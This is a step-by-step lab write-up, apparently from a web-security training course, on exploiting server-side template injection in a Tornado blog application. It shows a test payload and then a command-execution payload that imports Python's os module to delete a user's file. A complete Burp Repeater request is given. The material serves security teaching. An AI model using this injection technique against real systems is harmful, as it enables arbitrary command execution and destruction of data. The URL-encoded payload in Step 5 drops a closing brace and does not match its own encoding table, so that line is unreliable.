# Exploiting Server-Side Template Injection in Code Context

This guide provides a clear, creative, and organized walkthrough to exploit a **Server-Side Template Injection (SSTI)** vulnerability in a web application’s code context using the Tornado template engine. Imagine yourself as a digital alchemist, injecting forbidden code into the server’s template cauldron to unleash chaos! The objective is to manipulate the `blog-post-author-display` parameter to confirm SSTI, execute arbitrary Python code, and delete the file `/home/carlos/morale.txt` to solve the lab.

## Objective
Inject malicious Tornado template code into the `blog-post-author-display` parameter to exploit SSTI, use Python’s `os.system()` to run a system command, and delete `carlos`’s file to complete the lab.

## Prerequisites
- Burp Suite with Proxy and Repeater modules configured.
- Access to the lab application with a user account, blog comment feature, and "My account" page.
- Basic understanding of SSTI, Tornado template syntax, and Python’s `os` module.
- Familiarity with URL encoding for payloads.

## Background on the Vulnerability
The application uses the Tornado template engine to render user-controlled values, such as the `blog-post-author-display` parameter, which determines how the author’s name is displayed in blog comments. By injecting Tornado template syntax (e.g., `{{expression}}` or `{% code %}`), attackers can execute arbitrary code due to insufficient input sanitization. This allows escalation to system commands via Python’s `os.system()`, enabling destructive actions like file deletion.

## Steps to Solve the Lab

### Step 1: Post a Comment and Analyze Name Display
1. Open Burp’s browser, log in to your lab account, and post a comment on a blog post.
2. Navigate to the **My account** page and note the option to set the display name (`blog-post-author-display`) to `user.name`, `user.first_name`, or `user.nickname`.
3. Select a display option (e.g., `user.name`) and submit.
4. Reload the blog post page with your comment.
5. **Observation**: The name above your comment (e.g., "Peter Wiener") updates based on the selected option.

### Step 2: Capture the Display Name Request
1. In Burp Suite, go to **Proxy > HTTP history** and locate the `POST /my-account/change-blog-post-author-display` request.
2. **Observation**: The request includes the parameter `blog-post-author-display` (e.g., `blog-post-author-display=user.name`).
3. Right-click the request and select **Send to Repeater**.

### Step 3: Test for Template Injection
1. Research Tornado template syntax in the [official Tornado documentation](https://www.tornadoweb.org/en/stable/template.html).
2. **Observation**: Template expressions use double curly braces, e.g., `{{someExpression}}`, and code blocks use `{% somePython %}`.
3. In Repeater, inject a test payload to escape the expression and evaluate a mathematical operation:
   ```
   blog-post-author-display=user.name}}{{7*7}}
   ```
4. Send the request and reload the blog post page with your comment.
5. **Observation**: The comment’s author name displays as `Peter Wiener49}}`, confirming that `{{7*7}}` was evaluated to `49`, indicating an SSTI vulnerability in the code context.

![image](img/Basic%20server-side%20template%20injection%20(code%20context)/Basic%20server-side%20template%20injection%20(code%20context)(1).png)

### Step 4: Research Command Execution
1. In the Tornado documentation, note that `{% somePython %}` allows arbitrary Python code execution.
2. Consult the [Python documentation](https://docs.python.org/3/library/os.html) to identify the `os.system()` method, which executes shell commands.
3. **Observation**: Importing the `os` module and using `os.system("command")` enables running system commands like `rm`.

### Step 5: Craft the Malicious Payload
1. Construct a payload to delete `/home/carlos/morale.txt`:
   ```
   {% import os %}{{os.system('rm /home/carlos/morale.txt')}}
   ```
2. Combine with the valid expression to escape the context:
   ```
   user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}
   ```
3. URL-encode the payload:
   - `%` → `%25`
   - `{` → `%7B`
   - `}` → `%7D`
   - Space → `%20`
   - `/` → `%2F`
   - `'` → `%27`
   - Encoded payload: `user.name%7D%7D%7B%25+import+os+%25%7D%7B%7Bos.system(%27rm%20%2Fhome%2Fcarlos%2Fmorale.txt%27)%7D`
4. Update the Repeater request:
   ```
   POST /my-account/change-blog-post-author-display HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   
   blog-post-author-display=user.name%7D%7D%7B%25+import+os+%25%7D%7B%7Bos.system(%27rm%20%2Fhome%2Fcarlos%2Fmorale.txt%27)%7D
   ```

![image](img/Basic%20server-side%20template%20injection%20(code%20context)/Basic%20server-side%20template%20injection%20(code%20context)(2).png)

### Step 6: Execute the Exploit
1. Send the modified request in Repeater.
2. Reload the blog post page with your comment in the browser.
3. **Observation**: The server executes the `rm` command, deleting `/home/carlos/morale.txt`, solving the lab.

### Step 7: Verify Success
1. If the lab does not confirm completion, verify:
   - The payload is correctly URL-encoded and includes `user.name}}` to escape the context.
   - The syntax matches `{% import os %}{{os.system('rm /home/carlos/morale.txt')}}`.
   - The blog post page triggers the payload execution.
2. **Observation**: Successful deletion of the file completes the lab.

![image](img/Basic%20server-side%20template%20injection%20(code%20context)/Basic%20server-side%20template%20injection%20(code%20context)(3).png)